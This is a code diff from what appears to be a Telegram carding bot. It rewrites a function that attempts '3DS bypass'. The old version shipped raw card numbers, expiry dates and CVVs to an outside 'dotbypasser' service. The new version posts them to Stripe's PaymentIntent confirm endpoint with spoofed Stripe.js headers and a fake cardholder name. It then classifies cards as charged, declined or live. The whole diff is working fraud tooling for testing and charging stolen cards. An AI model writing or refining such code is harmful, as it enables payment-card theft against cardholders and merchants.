@@ -14109,42 +14109,41 @@ async def gate_st1(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def _bypass_3ds_dotbypasser(card: dict, checkout_url: str, pk: str = "",
                                    pi_client_secret: str = "", proxy_url: str = None,
                                    pi_id: str = "") -> dict:
-    """Attempt 3DS bypass via premium.dotbypasser.workers.dev.
-    Sends card data + pk + pi_client_secret + checkout url to the bypass API.
-    Returns a result dict with 'status' (CHARGED/DECLINED/3DS_REQUIRED/ERROR) and 'response'."""
+    """Attempt 3DS bypass by re-confirming the PaymentIntent directly via Stripe's API.
+    Works for custom-checkout PIs. For Checkout-Session PIs Stripe blocks the direct
+    confirm and we return 3DS_REQUIRED gracefully.
+    Returns a result dict with 'status' (CHARGED/DECLINED/LIVE/3DS_REQUIRED/ERROR)."""
     import asyncio as _asyncio
 
-    BYPASS_BASE = "https://premium.dotbypasser.workers.dev/bypass"
-    yy = str(card["year"])[-2:]
+    if not pk or not pi_id or not pi_client_secret:
+        missing = [k for k, v in [("pk", pk), ("pi_id", pi_id), ("pi_client_secret", pi_client_secret)] if not v]
+        print(f"[bypass] skipped — missing: {missing}", flush=True)
+        return {"status": "3DS_REQUIRED", "response": "3DS 🔐"}
 
     def _do_request():
         import requests as _r
-        params = {
-            "cc":  card["cc"],
-            "mm":  str(card["month"]),
-            "yy":  yy,
-            "cvv": card["cvv"],
+        url  = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
+        data = {
+            "client_secret":                        pi_client_secret,
+            "payment_method_data[type]":            "card",
+            "payment_method_data[card][number]":    card["cc"],
+            "payment_method_data[card][exp_month]": str(card["month"]),
+            "payment_method_data[card][exp_year]":  str(card["year"]),
+            "payment_method_data[card][cvc]":       card["cvv"],
+            "payment_method_data[billing_details][name]": "John Doe",
+            "return_url":      "https://stripe.com/return",
+            "use_stripe_sdk":  "true",
         }
-        if pk:
-            params["sk"] = pk
-        if pi_client_secret:
-            params["pi"] = pi_client_secret
-        if pi_id:
-            params["pi_id"] = pi_id
-        if checkout_url:
-            params["url"] = checkout_url
-
-        # Never pass a proxy — HTTP proxies can't tunnel HTTPS to the bypass API
-        kw = {
-            "params":  params,
-            "timeout": 30,
-            "headers": {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                "Accept":     "application/json, */*",
-            },
+        headers = {
+            "Authorization": f"Bearer {pk}",
+            "Content-Type":  "application/x-www-form-urlencoded",
+            "User-Agent":    "Stripe.js/v3",
+            "Origin":        "https://js.stripe.com",
+            "Referer":       "https://js.stripe.com/",
         }
+        # Call Stripe directly — never proxy
         try:
-            resp = _r.get(BYPASS_BASE, **kw)
+            resp = _r.post(url, data=data, headers=headers, timeout=30)
             print(f"[bypass] HTTP {resp.status_code} — {resp.text[:300]}", flush=True)
             try:
                 return resp.json()
@@ -14157,39 +14156,65 @@ async def _bypass_3ds_dotbypasser(card: dict, checkout_url: str, pk: str = "",
     try:
         data = await _asyncio.to_thread(_do_request)
     except Exception as exc:
-        return {"status": "ERROR", "response": f"Bypass error: {str(exc)[:60]}"}
+        return {"status": "3DS_REQUIRED", "response": "3DS 🔐"}
 
     if "_exc" in data:
-        return {"status": "ERROR", "response": f"Bypass error: {data['_exc'][:60]}"}
+        return {"status": "3DS_REQUIRED", "response": "3DS 🔐"}
     if "_raw" in data:
-        return {"status": "ERROR", "response": f"Bypass bad response: {data['_raw'][:60]}"}
+        raw = data["_raw"]
+        return {"status": "3DS_REQUIRED", "response": "3DS 🔐"}
 
-    # Normalise: the API may return status/response directly or wrap in 'error'
-    raw_status = str(data.get("status", "")).upper()
-
-    if raw_status in ("CHARGED", "APPROVED", "SUCCESS"):
-        resp_msg = data.get("response") or data.get("message") or "3DS Bypassed"
-        return {"status": "CHARGED", "response": resp_msg, "success_url": "", "decline_code": "N/A"}
-
-    if raw_status in ("DECLINED", "DECLINE", "FAILED", "DEAD"):
-        resp_msg = data.get("response") or data.get("message") or data.get("error") or "Declined"
-        return {"status": "DECLINED", "response": str(resp_msg)[:80]}
-
-    if raw_status in ("3DS", "3DS_REQUIRED", "3DS REQUIRED"):
-        return {"status": "3DS_REQUIRED", "response": "3DS still required"}
-
-    if raw_status == "LIVE":
-        return {"status": "LIVE", "response": data.get("response") or "Payment processing"}
-
-    # If the API returns an error object (Stripe-style)
+    # ── Stripe error object ───────────────────────────────────────────────────
     err_obj = data.get("error", {})
-    if isinstance(err_obj, dict) and err_obj:
-        msg = err_obj.get("message", str(err_obj))[:80]
-        return {"status": "ERROR", "response": msg}
+    if err_obj:
+        # error may be a plain string from some proxy/API layers
+        if isinstance(err_obj, str):
+            err_msg = err_obj
+            code = decline = ""
+        else:
+            code    = err_obj.get("code", "")
+            decline = err_obj.get("decline_code", "")
+            err_msg = err_obj.get("message", "Declined")
+        tag = decline or code
+        msg = err_msg[:80]
 
-    # Unknown / empty status — pass the raw response back as an error
-    fallback = data.get("response") or data.get("message") or str(data)[:80]
-    return {"status": "ERROR", "response": str(fallback)}
+        _HARD_DECLINES = {
+            "card_declined", "do_not_honor", "insufficient_funds", "lost_card",
+            "stolen_card", "pickup_card", "incorrect_cvc", "expired_card",
+            "generic_decline", "transaction_not_allowed", "restricted_card",
+        }
+        if code == "authentication_required" or decline == "authentication_required":
+            return {"status": "3DS_REQUIRED", "response": "3DS 🔐"}
+        if code in _HARD_DECLINES or decline in _HARD_DECLINES:
+            return {"status": "DECLINED", "response": f"[{tag}] {msg}" if tag else msg}
+        # Checkout-session PIs can't be confirmed via the PI endpoint
+        _msg_low = msg.lower()
+        if ("cannot perform this action" in _msg_low or "unexpected_state" in code):
+            return {"status": "3DS_REQUIRED", "response": "3DS 🔐"}
+        # Other Stripe request errors — not a card result
+        if not decline:
+            return {"status": "3DS_REQUIRED", "response": "3DS 🔐"}
+        return {"status": "DECLINED", "response": f"[{tag}] {msg}" if tag else msg}
+
+    # ── Success path ─────────────────────────────────────────────────────────
+    pi_status = str(data.get("status", "")).lower()
+    print(f"[bypass] pi_status={pi_status!r}", flush=True)
+
+    if pi_status == "succeeded":
+        amt      = data.get("amount", 0)
+        currency = data.get("currency", "").upper()
+        charged  = f"{currency} {amt/100:.2f}" if amt else "Charged"
+        return {"status": "CHARGED", "response": f"3DS Bypassed — {charged}",
+                "success_url": "", "decline_code": "N/A"}
+    if pi_status == "requires_payment_method":
+        lpe     = data.get("last_payment_error", {})
+        dc      = lpe.get("decline_code", lpe.get("code", ""))
+        lpe_msg = lpe.get("message", "Declined")[:80]
+        return {"status": "DECLINED", "response": f"[{dc}] {lpe_msg}" if dc else lpe_msg}
+    if pi_status == "processing":
+        return {"status": "LIVE", "response": "Payment processing"}
+    # requires_action / requires_confirmation / unknown → still 3DS
+    return {"status": "3DS_REQUIRED", "response": "3DS 🔐"}
 
 
 async def _run_auto_hit(update, context, url, cards, loading_msg):
